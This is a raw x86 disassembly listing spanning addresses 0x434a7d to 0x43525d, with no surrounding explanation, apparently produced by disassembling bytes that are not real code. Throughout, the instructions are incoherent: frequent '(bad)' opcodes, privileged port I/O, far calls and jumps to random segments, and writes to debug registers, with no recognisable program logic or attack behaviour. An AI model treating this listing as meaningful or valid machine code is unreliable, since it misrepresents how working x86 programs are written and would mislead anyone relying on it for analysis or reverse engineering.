  434a7d:	mov    ds:0xa18795c,al
  434a82:	xor    DWORD PTR [ecx+0x42],0x9216ee01
  434a89:	out    0xb,eax
  434a8b:	mov    eax,0xa5be00d6
  434a90:	mov    dl,0x10
  434a92:	xchg   ecx,eax
  434a93:	test   BYTE PTR [edi-0x3a817a3a],dh
  434a99:	jbe    0x434ab5
  434a9b:	ja     0x434b1a
  434a9d:	(bad)  
  434a9f:	aas    
  434aa0:	or     BYTE PTR [ebx],0x97
  434aa3:	loop   0x434a3a
  434aa5:	mov    edx,0x412bbffb
  434aaa:	call   0x8c09:0xd51acd1a
  434ab1:	jl     0x434ab8
  434ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ab4:	test   BYTE PTR [ecx],dl
  434ab6:	out    0xe1,eax
  434ab8:	jns    0x434a81
  434aba:	inc    ebp
  434abb:	shl    BYTE PTR [edx-0x4c7649cc],cl
  434ac1:	test   BYTE PTR [edi+edi*2+0x5fb8360f],al
  434ac8:	mov    ch,0x69
  434aca:	inc    esi
  434acb:	not    BYTE PTR [edx]
  434acd:	mov    ebx,0xb362ce00
  434ad2:	call   0x37c6:0x7fc5aa8b
  434ad9:	push   ebx
  434ada:	mov    esp,DWORD PTR [edi-0x7d0a860b]
  434ae0:	arpl   WORD PTR ds:0x7fb2c12d,dx
  434ae6:	xor    eax,0xd2d59aa4
  434aeb:	ins    DWORD PTR es:[edi],dx
  434aec:	test   BYTE PTR [ebx],0x8c
  434aef:	mov    DWORD PTR [edx+0x4c],edi
  434af2:	jge    0x434a7e
  434af4:	mov    ch,0x21
  434af6:	call   0xce81:0x2e977012
  434afd:	adc    ah,bh
  434aff:	test   eax,0xa76d083
  434b04:	repnz xor bl,BYTE PTR [esi-0x4bd53ec4]
  434b0b:	pusha  
  434b0c:	bound  ecx,QWORD PTR [esi+0x664c399b]
  434b12:	iret   
  434b13:	mov    esp,0xa71d6362
  434b18:	jg     0x434b6d
  434b1a:	pop    ecx
  434b1b:	sub    eax,0xe03f9c72
  434b20:	int    0x5b
  434b22:	mov    esp,esi
  434b24:	fwait
  434b25:	sbb    al,0x9d
  434b27:	jmp    0x6154:0x27346ff9
  434b2e:	mov    WORD PTR [eax-0x6057f447],es
  434b34:	mov    edx,0xe51fa55
  434b39:	pop    ebp
  434b3a:	js     0x434b63
  434b3c:	mov    dl,0x84
  434b3e:	mov    al,0xda
  434b40:	adc    al,0xd0
  434b42:	push   ebx
  434b43:	(bad)  
  434b44:	aas    
  434b45:	or     edx,DWORD PTR [eax]
  434b47:	pusha  
  434b48:	push   es
  434b49:	jno    0x434b2c
  434b4b:	shl    BYTE PTR [ebx-0x66067183],cl
  434b51:	push   0x8a0aa729
  434b56:	dec    esp
  434b57:	cmp    edx,ebp
  434b59:	add    BYTE PTR [edi+eiz*4],ch
  434b5c:	aas    
  434b5d:	jmp    0xbff70e43
  434b62:	add    eax,0x97cbbce1
  434b67:	xchg   ebx,eax
  434b68:	and    al,0xb
  434b6a:	int    0xb8
  434b6c:	int3   
  434b6d:	idiv   BYTE PTR ds:0xdcfc1a7
  434b73:	popa   
  434b74:	fidiv  WORD PTR [ecx]
  434b76:	adc    eax,0xa9ceb2a4
  434b7b:	pop    es
  434b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b7d:	dec    eax
  434b7e:	and    eax,DWORD PTR [eax+0x4c4f0b8a]
  434b84:	jno    0x434b72
  434b86:	xor    BYTE PTR [ecx-0x61],al
  434b89:	cwde   
  434b8a:	call   0x3edc:0xba722e8e
  434b91:	mov    edx,0x5481a7ea
  434b96:	or     ecx,DWORD PTR [esi+ecx*8]
  434b99:	cmovb  esi,DWORD PTR [bp+si+0x4442]
  434b9f:	mov    bl,0x35
  434ba1:	inc    edi
  434ba2:	push   ss
  434ba3:	cmc    
  434ba4:	sbb    eax,0xc3763d09
  434ba9:	call   FWORD PTR [eax-0x247ad23]
  434baf:	xor    al,0xb2
  434bb1:	out    0xe2,eax
  434bb3:	sbb    DWORD PTR [ebx+0x51],0xe7786a44
  434bba:	sbb    al,0xa7
  434bbc:	push   0xfff41ea3
  434bc1:	jecxz  0x434bbd
  434bc3:	xlat   BYTE PTR ds:[ebx]
  434bc4:	mov    bl,0x1
  434bc6:	cmc    
  434bc7:	pop    esp
  434bc8:	xor    DWORD PTR [ebp+edx*2-0x41],0x4e
  434bcd:	lea    esp,[ebx+0x64d67b8b]
  434bd3:	mov    cl,0x9e
  434bd5:	jmp    0x434c51
  434bd7:	mov    dl,0xb2
  434bd9:	jbe    0x434bd3
  434bdb:	stos   BYTE PTR es:[edi],al
  434bdc:	xchg   ebp,eax
  434bdd:	adc    al,0x69
  434bdf:	aam    0x54
  434be1:	or     ebx,DWORD PTR [eax-0x5e]
  434be4:	daa    
  434be5:	ret    0xfdfe
  434be8:	dec    ebx
  434be9:	jl     0x434b85
  434beb:	(bad)  
  434bec:	jmp    DWORD PTR [edi]
  434bee:	jne    0x434c3f
  434bf0:	sub    ah,BYTE PTR [eax+0x4f89998a]
  434bf6:	sbb    ah,ch
  434bf8:	enter  0x4da,0x21
  434bfc:	push   ebx
  434bfd:	repz cdq 
  434bff:	rol    DWORD PTR [eax+0x640abf0c],cl
  434c05:	les    edx,FWORD PTR [ebp-0x5814c9b8]
  434c0b:	nop
  434c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434c0d:	jmp    0x8a47:0x4b1a683
  434c14:	(bad)  
  434c15:	cmc    
  434c16:	shr    DWORD PTR [edi-0x4d],1
  434c19:	mov    eax,0xe0a3f99a
  434c1e:	and    al,0x3c
  434c20:	push   0x69
  434c22:	stos   BYTE PTR es:[edi],al
  434c23:	test   al,0x86
  434c25:	sub    eax,0x1e125f21
  434c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434c2b:	into   
  434c2c:	fidiv  WORD PTR [ebx+0x20b377e2]
  434c32:	ins    DWORD PTR es:[edi],dx
  434c33:	add    al,0x75
  434c35:	fld    QWORD PTR [ebx+0x533dd2ec]
  434c3b:	mov    ds:0x2d012a63,al
  434c40:	ror    DWORD PTR [ebx+0x1880e0ee],0x95
  434c47:	mov    ds:0x873e5efe,eax
  434c4c:	(bad)
  434c4f:	js     0x434ccc
  434c51:	xor    dl,bh
  434c53:	cmp    DWORD PTR [ebp+0x323e5f6e],0xc975a5ee
  434c5d:	sbb    DWORD PTR [edx-0xaa7bf71],0x23
  434c64:	icebp  
  434c65:	pop    edi
  434c66:	mov    ds:0x7949f6a7,al
  434c6b:	adc    eax,DWORD PTR [ecx]
  434c6d:	xchg   edx,eax
  434c6e:	pop    esp
  434c6f:	adc    dh,BYTE PTR [edx+0x65e60661]
  434c75:	jo     0x434c0e
  434c77:	aam    0xe6
  434c79:	or     cl,BYTE PTR [edx]
  434c7b:	dec    esp
  434c7c:	call   0xead6:0x7a0b1f42
  434c83:	inc    edi
  434c84:	sub    ecx,DWORD PTR [esp+eiz*8]
  434c87:	out    0xb2,al
  434c89:	cld    
  434c8a:	xor    esi,DWORD PTR [esi+0x41cdd1da]
  434c90:	jl     0x434c9d
  434c92:	add    eax,0xa47f5c28
  434c97:	fs daa 
  434c99:	repnz cdq 
  434c9b:	xchg   ebx,eax
  434c9c:	lods   al,BYTE PTR ds:[esi]
  434c9d:	cmp    dh,bh
  434c9f:	mov    al,0x57
  434ca1:	mov    WORD PTR [edx+0x50],ds
  434ca4:	pop    ss
  434ca5:	test   al,0x6c
  434ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ca8:	outs   dx,BYTE PTR ds:[esi]
  434ca9:	adc    esp,DWORD PTR [eax]
  434cab:	mov    esi,0xb326842
  434cb0:	fwait
  434cb1:	in     al,dx
  434cb2:	test   DWORD PTR [ecx],ebp
  434cb4:	xor    eax,0x9f539a87
  434cb9:	test   bl,bh
  434cbb:	jne    0x434c4f
  434cbd:	or     esp,ebx
  434cbf:	or     eax,0x9368f85
  434cc4:	mov    ch,0x24
  434cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434cc7:	pop    esi
  434cc8:	jmp    0x5728:0xee306e0b
  434ccf:	std    
  434cd0:	icebp  
  434cd1:	or     ebp,edx
  434cd3:	fldenv [ebp+0x42]
  434cd6:	retf   
  434cd7:	popf   
  434cd8:	cmp    DWORD PTR [esi],esp
  434cda:	call   0x3fc2:0x64411ffa
  434ce1:	sbb    edi,esp
  434ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ce4:	push   cs
  434ce5:	pmaxsw mm7,mm7
  434ce8:	mul    bl
  434cea:	jmp    0x434c8b
  434cec:	mov    cl,BYTE PTR [ecx-0x6f41fcbe]
  434cf2:	call   0xdb2f:0x4a2b0a37
  434cf9:	div    DWORD PTR [esi]
  434cfb:	mov    ds:0xd715663c,eax
  434d00:	adc    DWORD PTR [ecx+0x6e94275a],esp
  434d06:	and    esp,DWORD PTR [edi+0x70dc3810]
  434d0c:	and    ch,BYTE PTR [eax-0x3f]
  434d0f:	push   cs
  434d10:	mov    dl,0xe2
  434d12:	scas   eax,DWORD PTR es:[edi]
  434d13:	outs   dx,BYTE PTR ds:[esi]
  434d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434d15:	out    0xac,eax
  434d17:	jp     0x434d04
  434d19:	or     ebp,DWORD PTR [ebx+0x7d]
  434d1c:	stc    
  434d1d:	jecxz  0x434cda
  434d1f:	cmp    esp,edi
  434d21:	xor    esp,ecx
  434d23:	lods   eax,DWORD PTR ds:[esi]
  434d24:	mov    dl,0xd8
  434d26:	jge    0x434d0f
  434d28:	shl    DWORD PTR [ecx-0x16117688],1
  434d2e:	in     eax,0xa7
  434d30:	add    DWORD PTR [edx-0x8],esi
  434d33:	fs xchg ebx,eax
  434d35:	mov    bh,0xad
  434d37:	xor    DWORD PTR [edx-0x7d0d616b],0xfe3ed2f2
  434d41:	or     esi,DWORD PTR [edx]
  434d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434d44:	lea    eax,[edx]
  434d46:	mov    ecx,0x95787322
  434d4b:	loopne 0x434ce8
  434d4d:	xchg   esp,eax
  434d4e:	jle    0x434d17
  434d50:	add    eax,0xe54abb4d
  434d55:	or     al,0x50
  434d57:	sbb    ebx,DWORD PTR [eax-0x580f050f]
  434d5d:	pop    ebx
  434d5e:	div    BYTE PTR [esi-0x5065c6e4]
  434d64:	adc    al,0x24
  434d66:	sahf   
  434d67:	dec    edx
  434d68:	daa    
  434d69:	call   0xf1e7f60e
  434d6e:	and    BYTE PTR ds:0x3afaa63c,0x62
  434d75:	ret    
  434d76:	pop    ds
  434d77:	push   ds
  434d78:	mov    al,ds:0xb5cb71ed
  434d7d:	clc    
  434d7e:	or     eax,DWORD PTR [edx]
  434d80:	inc    edx
  434d81:	lock scas al,BYTE PTR es:[edi]
  434d83:	test   ch,bl
  434d85:	or     esi,DWORD PTR [eax+0x357134ce]
  434d8b:	pop    edi
  434d8c:	push   ebp
  434d8d:	fidiv  DWORD PTR [ebp+eax*8-0x4e]
  434d91:	xor    ebx,esp
  434d93:	out    0x4c,al
  434d95:	pop    ds
  434d96:	xor    BYTE PTR [eax+0x56a70b49],bh
  434d9c:	aad    0x12
  434d9e:	lods   al,BYTE PTR ds:[esi]
  434d9f:	fld    QWORD PTR [edx-0x1035a09]
  434da5:	or     eax,DWORD PTR [ecx-0x5271f41f]
  434dab:	leave  
  434dac:	sbb    BYTE PTR [ebx],cl
  434dae:	addr16 into 
  434db0:	daa    
  434db1:	pop    ecx
  434db2:	ins    DWORD PTR es:[edi],dx
  434db3:	fcmovu st,st(5)
  434db5:	xchg   edi,eax
  434db6:	call   0x6aec:0x2b5254ae
  434dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434dbe:	dec    esi
  434dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434dc0:	aaa    
  434dc1:	je     0x434d69
  434dc3:	popf   
  434dc4:	xor    BYTE PTR [ecx+0x66b21bba],0x67
  434dcb:	std    
  434dcc:	sub    al,0x56
  434dce:	repz pop esi
  434dd1:	call   FWORD PTR [esi-0x5c]
  434dd4:	aad    0xa3
  434dd6:	inc    edi
  434dd7:	jl     0x434d6c
  434dd9:	jecxz  0x434df5
  434ddb:	in     al,dx
  434ddc:	arpl   WORD PTR [edx+ebx*4-0x7],si
  434de0:	push   ecx
  434de1:	jne    0x434d9b
  434de3:	loop   0x434de4
  434de5:	ror    BYTE PTR [edi-0x4f],0xdf
  434de9:	in     al,dx
  434dea:	je     0x434d90
  434dec:	out    0x7,eax
  434dee:	test   eax,0x1c8e6b54
  434df3:	push   esi
  434df4:	aas    
  434df5:	retf   0x4663
  434df8:	ret    
  434df9:	(bad)  
  434dfa:	jnp    0x434df2
  434dfc:	mov    dl,0xa5
  434dfe:	or     al,0xfb
  434e00:	pop    es
  434e01:	int3   
  434e02:	push   esp
  434e03:	push   ds
  434e04:	mov    DWORD PTR [ebx],ecx
  434e06:	int3   
  434e07:	mov    cl,0x18
  434e09:	mov    esp,0xb8d14cec
  434e0e:	call   0xc258:0x18bff1c7
  434e15:	(bad)  
  434e16:	lock and DWORD PTR [ebx-0x6d],0x5d
  434e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e1c:	sub    DWORD PTR ds:0xd911b5dd,ecx
  434e22:	call   0xbd8c:0xf6954ff8
  434e29:	ss push ecx
  434e2b:	popf   
  434e2c:	mov    dh,0xe3
  434e2e:	call   0x7df1:0x339c5073
  434e35:	ja     0x434dd0
  434e37:	mov    ebx,0x563c3d0a
  434e3c:	sbb    al,0xdb
  434e3e:	call   0x6a4eb78c
  434e43:	pusha  
  434e44:	rcl    BYTE PTR [esi],1
  434e46:	lahf   
  434e47:	popa   
  434e48:	mov    ah,0x72
  434e4a:	call   0x7631:0x4d3678ae
  434e51:	mov    eax,0xc4cfa7b3
  434e56:	cmp    BYTE PTR [esi-0x632c6d1],ah
  434e5c:	mov    ebp,0x680a6c13
  434e61:	dec    ebx
  434e62:	sti    
  434e63:	enter  0xa501,0xa1
  434e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e68:	sub    eax,0xf59df3ac
  434e6d:	mov    ebp,0x92b29089
  434e72:	or     DWORD PTR [ebx-0x54],0x4eb5ee99
  434e79:	add    al,0xd6
  434e7b:	dec    esi
  434e7c:	in     al,dx
  434e7d:	ret    0x5d5a
  434e80:	push   ebp
  434e81:	jnp    0x434e31
  434e83:	hlt    
  434e84:	mov    bh,BYTE PTR [eax+0x53dda7c3]
  434e8a:	data16 sbb al,0x24
  434e8d:	xor    bl,bl
  434e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e90:	icebp  
  434e91:	enter  0x6d5c,0x59
  434e95:	add    al,0x70
  434e97:	dec    edi
  434e98:	mov    bh,0x30
  434e9a:	sub    al,0xd5
  434e9c:	imul   esi,DWORD PTR [ebx-0x2c2c77a6],0x9afda7b6
  434ea6:	out    dx,eax
  434ea7:	stc    
  434ea8:	mov    ds:0xae0f43b7,al
  434ead:	adc    DWORD PTR [esi+0x5b],esi
  434eb0:	cmp    eax,edx
  434eb2:	lahf   
  434eb3:	daa    
  434eb4:	add    al,0x2d
  434eb6:	jns    0x434e73
  434eb8:	cs pop ebx
  434eba:	lea    ecx,[edi-0x16]
  434ebd:	or     esi,DWORD PTR [ecx]
  434ebf:	iret   
  434ec0:	mov    edx,0xc74f4599
  434ec5:	loope  0x434e64
  434ec7:	xchg   DWORD PTR [eax],edi
  434ec9:	pop    ebp
  434eca:	cli    
  434ecb:	mov    bl,0xd2
  434ecd:	inc    edx
  434ece:	mov    al,0x4
  434ed0:	out    0xb,eax
  434ed2:	aad    0x76
  434ed4:	add    DWORD PTR [ecx+0x2dbba574],ecx
  434eda:	xchg   esp,eax
  434edb:	loop   0x434ef4
  434edd:	jecxz  0x434ef6
  434edf:	and    eax,0xc709c6cd
  434ee4:	or     eax,0xc6a09050
  434ee9:	jno    0x434e9a
  434eeb:	aas    
  434eec:	loop   0x434e78
  434eee:	icebp  
  434eef:	aam    0xa8
  434ef1:	jne    0x434f1d
  434ef3:	add    al,0xab
  434ef5:	or     edx,DWORD PTR [esi-0x1b7a730d]
  434efb:	pop    esp
  434efc:	ds pop ebp
  434efe:	call   0x2222:0x87fbeeb3
  434f05:	inc    ebx
  434f06:	mov    ah,0xa0
  434f08:	lods   al,BYTE PTR ds:[esi]
  434f09:	mov    bh,0xfc
  434f0b:	inc    edx
  434f0c:	jno    0x434eb9
  434f0e:	dec    esp
  434f0f:	sahf   
  434f10:	dec    edx
  434f11:	push   esp
  434f12:	call   0xc395:0x9db8f2de
  434f19:	aas    
  434f1a:	pushf  
  434f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434f1c:	mov    dh,0xa9
  434f1e:	adc    ebp,ebx
  434f20:	dec    ebx
  434f21:	stc    
  434f22:	or     ebp,DWORD PTR [eax-0x4d]
  434f25:	mov    edx,DWORD PTR [ebx+0x5a2e30be]
  434f2b:	inc    edi
  434f2c:	inc    esi
  434f2d:	or     bl,dh
  434f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434f30:	and    eax,0xe92c1f8a
  434f35:	jp     0x434ed3
  434f37:	jo     0x434ee6
  434f39:	mov    dl,0xb2
  434f3b:	div    BYTE PTR [edx]
  434f3d:	cmp    ah,BYTE PTR [edx+0x1b]
  434f40:	mov    al,ds:0xf3d22b06
  434f45:	es dec esp
  434f47:	and    eax,0xb19a06cc
  434f4c:	outs   dx,BYTE PTR ds:[esi]
  434f4d:	pop    edi
  434f4e:	popf   
  434f4f:	popa   
  434f50:	push   ecx
  434f51:	sub    al,0x5
  434f53:	and    ah,dl
  434f55:	cdq    
  434f56:	(bad)  
  434f57:	aaa    
  434f58:	push   esp
  434f59:	or     BYTE PTR [eax+0x17],bl
  434f5c:	pop    ss
  434f5d:	ins    BYTE PTR es:[edi],dx
  434f5e:	bound  eax,QWORD PTR [edi+0x55]
  434f61:	sub    eax,0xb519a619
  434f66:	push   eax
  434f67:	push   cs
  434f68:	pop    edx
  434f69:	shr    BYTE PTR [ecx-0x29ad4abd],0xd9
  434f70:	inc    ecx
  434f71:	or     esi,DWORD PTR [eax+0x39f21064]
  434f77:	icebp  
  434f78:	dec    esi
  434f79:	push   ebx
  434f7a:	jnp    0x434f9c
  434f7c:	mov    dl,0x85
  434f7e:	sbb    edx,DWORD PTR [eax]
  434f80:	xchg   edi,eax
  434f81:	hlt    
  434f82:	stos   BYTE PTR es:[edi],al
  434f83:	sbb    eax,0xa89ab240
  434f88:	sub    ebx,DWORD PTR [esi+ebx*8]
  434f8b:	imul   DWORD PTR [ebx+0x17]
  434f8e:	in     al,dx
  434f8f:	test   al,0xcb
  434f91:	cmovs  edx,DWORD PTR [eax+eax*4]
  434f95:	or     ebx,DWORD PTR [edi]
  434f97:	adc    dx,WORD PTR [ebx+0x7aad2bb9]
  434f9e:	das    
  434f9f:	push   ss
  434fa0:	xor    ch,BYTE PTR [ebx+esi*2]
  434fa3:	inc    edi
  434fa4:	std    
  434fa5:	cmp    al,0xe1
  434fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434fa8:	inc    esp
  434fa9:	fidiv  WORD PTR [edx+0x1a264dcd]
  434faf:	js     0x435026
  434fb1:	xor    BYTE PTR [eax+0xbe2b5ef],al
  434fb7:	(bad)  
  434fb8:	sub    BYTE PTR [edx+ebp*1-0x66],cl
  434fbc:	sbb    al,0x54
  434fbe:	jne    0x434f64
  434fc0:	dec    eax
  434fc1:	jge    0x434f8d
  434fc3:	add    al,0x1e
  434fc5:	jb     0x435031
  434fc7:	adc    BYTE PTR [eax],al
  434fc9:	mov    bl,BYTE PTR [edx-0x26cc66d]
  434fcf:	jmp    0x5330:0xb14390e6
  434fd6:	and    DWORD PTR [edi+0x57],ecx
  434fd9:	or     al,0xf7
  434fdb:	test   al,0x51
  434fdd:	inc    edx
  434fde:	dec    edx
  434fdf:	arpl   ax,bp
  434fe1:	push   cs
  434fe2:	xchg   ebx,eax
  434fe3:	sub    DWORD PTR [ebx+0x65],0x4aaca0c1
  434fea:	mov    bh,0xa7
  434fec:	popa   
  434fed:	inc    ebp
  434fee:	lods   eax,DWORD PTR ds:[esi]
  434fef:	dec    ebp
  434ff0:	mov    dl,0x4e
  434ff2:	out    dx,al
  434ff3:	xor    DWORD PTR [ebx],ecx
  434ff5:	add    ah,BYTE PTR [eax]
  434ff7:	xor    eax,0xb6010b1d
  434ffc:	mov    ecx,0xef34989a
  435001:	test   ah,al
  435003:	adc    DWORD PTR [edx],edx
  435005:	cs retf 0x2a6
  435009:	test   al,0xfc
  43500b:	imul   ebx,DWORD PTR [edi],0x1d
  43500e:	enter  0x54e7,0x29
  435012:	mov    fs,WORD PTR [ebp-0x4e]
  435015:	bound  eax,QWORD PTR [esi+0x53]
  435018:	icebp  
  435019:	lods   eax,DWORD PTR ds:[esi]
  43501a:	push   esp
  43501b:	mov    ebp,0xa5d67322
  435020:	sti    
  435021:	push   0x137b672a
  435026:	fxch   st(2)
  435028:	popa   
  435029:	cli    
  43502a:	sub    bl,cl
  43502c:	fs lea esi,ss:[edi-0x70]
  435031:	mov    esi,0x99a8bb9b
  435036:	in     al,dx
  435037:	inc    ebx
  435038:	jbe    0x4350b1
  43503a:	pop    edi
  43503b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43503c:	xchg   BYTE PTR ds:0xa3f52af0,bh
  435042:	cld    
  435043:	inc    ebx
  435044:	push   ecx
  435045:	push   es
  435046:	(bad)  
  435047:	test   BYTE PTR [ebp-0x3f],0x9a
  43504b:	dec    ecx
  43504c:	jge    0x43507a
  43504e:	jbe    0x435074
  435050:	mov    ecx,DWORD PTR [esi]
  435052:	div    DWORD PTR [esi]
  435054:	jno    0x435090
  435056:	inc    ebp
  435057:	mov    ds:0x276d8352,eax
  43505c:	imul   edi,DWORD PTR [ecx-0x474d466d],0xe42fe304
  435066:	jmp    0x6ca7:0x2377212d
  43506d:	cmc    
  43506e:	and    ebx,edx
  435070:	addr16 pop ebx
  435072:	imul   edx,DWORD PTR [esi],0x835df0b2
  435078:	pop    ebx
  435079:	pop    edi
  43507a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43507b:	aas    
  43507c:	push   esi
  43507d:	or     al,0x3
  43507f:	ret    
  435080:	xor    eax,0xefc7109a
  435085:	jge    0x435076
  435087:	or     al,0xb5
  435089:	cmp    eax,0xa807ca07
  43508e:	or     dl,BYTE PTR [ebx+0x66]
  435091:	push   es
  435092:	inc    esi
  435093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435094:	mov    eax,gs:0xb54c2c19
  43509a:	lea    ebp,[esi]
  43509c:	mov    dl,0x59
  43509e:	ins    BYTE PTR es:[edi],dx
  43509f:	sbb    dl,BYTE PTR [edx+0x59eae88e]
  4350a5:	or     ebx,esp
  4350a7:	cmp    ch,cl
  4350a9:	add    BYTE PTR [edx-0x6c],ah
  4350ac:	mov    ebx,0xe8a29abd
  4350b1:	ds inc edx
  4350b3:	fld    DWORD PTR [esi]
  4350b5:	pop    eax
  4350b6:	push   0x3ac738a7
  4350bb:	xor    eax,0xcfa31ab8
  4350c0:	lds    esp,FWORD PTR [edx]
  4350c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4350c3:	inc    eax
  4350c4:	(bad)
  4350c7:	add    BYTE PTR [edx],bh
  4350c9:	out    0xf7,al
  4350cb:	pop    esp
  4350cc:	sbb    eax,0xacac74dd
  4350d1:	sahf   
  4350d2:	outs   dx,DWORD PTR ds:[esi]
  4350d3:	cmp    dh,BYTE PTR [edx-0x3d8f70b]
  4350d9:	add    ch,BYTE PTR [edx]
  4350db:	inc    ebp
  4350dc:	lods   al,BYTE PTR ds:[esi]
  4350dd:	popf   
  4350de:	nop
  4350df:	sub    bh,ah
  4350e1:	call   DWORD PTR [edi+eiz*4-0x572fbf63]
  4350e8:	xchg   esp,eax
  4350e9:	or     ebp,DWORD PTR [esi-0xfe730b5]
  4350ef:	das    
  4350f0:	aas    
  4350f1:	mov    ds:0x8d0bd79a,al
  4350f6:	or     DWORD PTR [ecx-0xf],0x6c
  4350fa:	pop    ecx
  4350fb:	popf   
  4350fc:	imul   ebp,DWORD PTR [edx-0x66],0xffffff86
  435100:	mov    ds:0x567e7e0,al
  435105:	mov    al,ds:0xd173479a
  43510a:	mov    WORD PTR [ebp+0x453da3ad],gs
  435110:	sub    cl,BYTE PTR [edx]
  435112:	pushf  
  435113:	pop    ss
  435114:	jnp    0x435172
  435116:	pop    ss
  435117:	sub    eax,0x10a5d393
  43511c:	mov    dl,0xaa
  43511e:	ret    
  43511f:	int    0x2d
  435121:	pusha  
  435122:	dec    ebp
  435123:	mov    edi,0x49d204f4
  435128:	sti    
  435129:	das    
  43512a:	jge    0x43519e
  43512c:	jmp    FWORD PTR [ebx]
  43512e:	adc    al,0x3c
  435130:	sub    BYTE PTR [ecx-0x492e7866],al
  435136:	dec    eax
  435137:	cmp    BYTE PTR [esi-0x455f1bbe],bl
  43513d:	mov    ebx,0x2b46ba52
  435142:	inc    esi
  435143:	popa   
  435144:	retf   0x9b60
  435147:	les    eax,FWORD PTR [edi]
  435149:	(bad)  
  43514a:	cld    
  43514b:	das    
  43514c:	ins    DWORD PTR es:[edi],dx
  43514d:	cs push esi
  43514f:	xchg   edi,eax
  435150:	xor    BYTE PTR [esp+eiz*4],cl
  435153:	sbb    dh,BYTE PTR [ebp-0x5c]
  435156:	loopne 0x43510f
  435158:	mov    ebp,0xb2f4a164
  43515d:	fcom   DWORD PTR [edx+ebx*8]
  435160:	or     BYTE PTR [edi+edx*4-0x30e8d575],al
  435167:	mov    ecx,0x587b8b48
  43516c:	mov    db6,ecx
  43516f:	push   ecx
  435170:	mov    dl,0xd6
  435172:	inc    esi
  435173:	test   eax,0x99a3d965
  435178:	(bad)  
  435179:	jg     0x4351db
  43517b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43517c:	xchg   edx,eax
  43517d:	lods   al,BYTE PTR ds:[esi]
  43517e:	lds    eax,FWORD PTR [esi]
  435180:	push   eax
  435181:	jp     0x435167
  435183:	aas    
  435184:	pushf  
  435185:	add    eax,0xf7b1eacd
  43518a:	imul   BYTE PTR [eax]
  43518c:	lods   eax,DWORD PTR ds:[esi]
  43518d:	jecxz  0x435194
  43518f:	jbe    0x43516a
  435191:	out    0xc6,eax
  435193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435194:	(bad)  
  435195:	add    DWORD PTR [eax+0x369f198b],eax
  43519b:	mov    BYTE PTR [edx+0x3c418f18],dh
  4351a1:	mov    DWORD PTR [ebx+0x90b0e46],edi
  4351a7:	fcomp  DWORD PTR ds:0x1297d00d
  4351ad:	mov    dh,0x2f
  4351af:	and    BYTE PTR [ebx],al
  4351b1:	mov    ebp,0x4a0cfd6b
  4351b6:	mov    edx,0xb90b83b7
  4351bb:	pusha  
  4351bc:	dec    ebx
  4351bd:	daa    
  4351be:	repz dec ebx
  4351c0:	and    al,BYTE PTR [ecx-0x66]
  4351c3:	lahf   
  4351c4:	pop    esp
  4351c5:	fst    QWORD PTR ds:0x9f3490cc
  4351cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4351cc:	(bad)  
  4351ce:	xor    edi,edi
  4351d0:	enter  0xeaa1,0x73
  4351d4:	cs in  eax,dx
  4351d6:	call   0xc155:0x87eab3d1
  4351dd:	cs (bad) 
  4351df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4351e0:	(bad)  
  4351e2:	push   cs
  4351e3:	sbb    ch,0xe6
  4351e6:	sti    
  4351e7:	in     al,dx
  4351e8:	ret    
  4351e9:	ins    BYTE PTR es:[edi],dx
  4351ea:	call   0xd1e0:0x7ae01101
  4351f1:	xchg   edx,eax
  4351f2:	int3   
  4351f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4351f4:	mov    edx,0xde9e6fd0
  4351f9:	inc    edx
  4351fa:	out    0x2,eax
  4351fc:	mov    dl,0x98
  4351fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4351ff:	dec    esi
  435200:	jne    0x435271
  435202:	dec    edx
  435203:	add    al,0x49
  435205:	or     ecx,eax
  435207:	xor    BYTE PTR [ebx],cl
  435209:	adc    dh,cl
  43520b:	dec    ebp
  43520c:	and    BYTE PTR [eax],cl
  43520e:	xchg   ebp,eax
  43520f:	dec    eax
  435210:	hlt    
  435211:	ja     0x435230
  435213:	daa    
  435214:	fcmovne st,st(7)
  435216:	inc    ebp
  435217:	push   edx
  435218:	scas   eax,DWORD PTR es:[edi]
  435219:	or     eax,DWORD PTR ds:0x8ead017
  43521f:	cmp    al,0xd7
  435221:	daa    
  435222:	call   0x3325:0x3e310c06
  435229:	push   0xa4dfa7a4
  43522e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43522f:	rcr    BYTE PTR [ebp-0x4c41321e],cl
  435235:	shr    dh,1
  435237:	out    dx,eax
  435238:	add    BYTE PTR ds:0x4c923017,dl
  43523e:	test   al,0xa7
  435240:	cwde   
  435241:	imul   esi,ecx,0x79506ff2
  435247:	div    DWORD PTR [ebx+0x4daf8b09]
  43524d:	mov    al,ds:0xcf92767f
  435252:	inc    edx
  435253:	pushf  
  435254:	mov    DWORD PTR [edx+ebx*1],esi
  435257:	(bad)  
  435258:	jnp    0x4352b5
  43525a:	(bad)
  43525d:	cmp    edi,DWORD PTR [edx-0x80]
